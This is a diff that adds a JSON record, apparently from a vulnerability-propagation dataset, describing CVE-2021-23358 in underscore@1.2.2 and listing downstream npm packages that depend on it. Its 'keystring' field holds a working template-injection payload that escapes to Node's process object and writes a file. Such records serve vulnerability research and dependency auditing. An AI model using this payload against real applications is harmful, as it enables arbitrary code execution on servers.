@@ -1,0 +1,27 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.2.2",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "beet@0.1.14",
+    "daisy@0.2.0",
+    "assetgraph-sprite@0.2.10",
+    "biwascheme@0.6.9",
+    "ndoc@0.1.0",
+    "cucumber@0.2.10",
+    "bob@0.3.0",
+    "graphdat@0.4.1",
+    "tock@0.1.0",
+    "maple@0.0.1",
+    "shovel@0.0.5",
+    "nexus@0.0.1",
+    "nexus-web@0.0.0",
+    "pow-mongodb-fixtures@0.2.0",
+    "repoman@0.0.1",
+    "forever-webui@0.1.0",
+    "ae86@0.0.2",
+    "@zaoqi/biwascheme@0.6.9-1-87ac65c4a65142753d0d65caf8065421125692e5"
+  ]
+}
